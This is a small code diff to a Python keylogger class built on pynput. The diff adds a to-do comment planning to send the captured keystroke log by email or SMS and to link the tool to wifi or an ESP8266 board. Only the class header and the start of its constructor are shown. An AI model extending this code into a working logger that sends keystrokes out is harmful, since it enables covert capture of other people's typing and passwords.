@@ -2,6 +2,16 @@ import pynput.keyboard
 import threading
 import os
 
+"""
+To be add:
+
+- log file send to email or sms 
+- conection on wifi??
+- conection os esp8266
+- add args in the code
+
+"""
+
 class Keylogger:
     def __init__(self, time_interval, log_file):
         self.log = log_file
